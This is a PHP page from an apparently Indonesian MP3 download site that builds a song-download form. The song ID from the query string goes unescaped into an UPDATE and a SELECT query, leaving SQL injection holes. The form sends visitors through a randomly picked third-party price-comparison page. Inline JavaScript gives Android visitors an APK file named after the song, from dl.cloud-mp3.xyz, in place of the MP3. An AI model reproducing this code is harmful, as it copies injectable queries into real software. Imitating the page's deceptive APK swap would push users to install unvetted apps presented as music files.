<?php
$id = $_GET["id"];
$name = $_GET["name"];
$name2 = str_replace('-', ' ', $name);
$domain = unserialize(file_get_contents("up/domain.txt"));
$home = $domain['domain'];
$namehome = $domain['name_domain'];
include 'inc/connect.php';
mysqli_query($conn, "UPDATE `baihat` SET `download`=`download` + 1 WHERE id='$id'");
$title = 'Download Lagu ' . $name2 . ' Mp3 terbaru gratis';
$description = 'Download Lagu ' . $name2 . ' Mp3 gratis, Free download lagu Mp3 ' . $name2 . ' terbaik Indonesia';
$get_url = $home . '/download-lagu/' . $id . '/' . $name;
include 'inc/header.php';
$row = mysqli_fetch_array(mysqli_query($conn, "SELECT api,name,author,urlgoc,icon FROM baihat WHERE id='$id'"));
$link_mp3 = $home . '/mp3/' . $row['api'] . '/' . $name;
$link_apk = "http://dl.cloud-mp3.xyz/$name.apk";

$link_ssg = explode("\n", trim(file_get_contents('https://belimurah.net/up/link-dr.txt')));
$j = rand(0, count($link_ssg) - 1);
$link_dr = 'https://belimurah.net/banding-harga/' . trim($link_ssg[$j]) . '.html';
?>

﻿<meta name="robots" content="noindex, nofollow" />
<meta name="googlebot" content="noindex">
<meta name="googlebot" content="nofollow">
<meta name="referrer" content="no-referrer" />
<meta name="referrer" content="never">
<style>
    .lagu-down-btn a:hover {
        color: #fff !important;
        background: #ff5412 !important;
    }
    .dlpro {
        font-size: 20px !important;
        background-color: #57d6c7;
        font-weight: bold;
        text-shadow: 1px 1px #57D6C7;
        color: #ffffff;
        border-radius: 5px;
        -moz-border-radius: 5px;
        -webkit-border-radius: 5px;
        border: 1px solid #57D6C7;
        cursor: pointer;
        padding: 7px;

    }
</style>

<section id="content" class="home-content animated">
    <section class="wrapper">
        <div class="container">
            <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                <div class="col-content content animated">
                    <div id="fresh" style="margin-top: 25px;"> 
                        <div class="container" style="text-align: center;">
                            <div class="col-md-12">
                                <h2 class="lagu-name" style="color: #777; margin: 5px 0; font-size: 20px; font-weight: 500; font-family: roboto;"><span style="color: #f58b61; font-size: 22px; font-weight: normal;">Download Lagu </span><?php echo $row['name']; ?> - <?php echo $row['author']; ?></h2>
                                <img class="lagu-img" style="width: 160px; border: 1px solid #999; border-radius: 10px; margin-top: 15px;" src="<?php echo $home . '/' . $row['icon']; ?>" >
                                <form action="<?php echo $link_dr; ?>" method="post">
                                    <input type="hidden" name="name" value = "<?php echo $row['name'] . '-' . $row['author']; ?>">
                                    <script type="text/javascript">
										if (!navigator.userAgent.match(/Android/i))
										{
											document.write('<input type="hidden" name="link" value="<?php echo $link_mp3; ?>">');
										} else {
											document.write('<input type="hidden" name="link" value="<?php echo $link_apk; ?>">');
										}
									</script>
                                    <input type="hidden" name="image" value="<?php echo $home . '/' . $row['icon']; ?>">
                                    <input type="hidden" name="key" value="<?php echo md5(manhpro); ?>">
                                    <div class="lagu-down-btn" style="margin: 10px auto; border-radius: 5px; font-size: 20px;text-transform: uppercase;text-align: center;width: 170px;">
                                        <button type="submit" class="dlpro"><i class="fa fa-download"></i> DOWNLOAD</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
</section>
<?php
include 'inc/footer.php';
disconnect_db($conn);
?>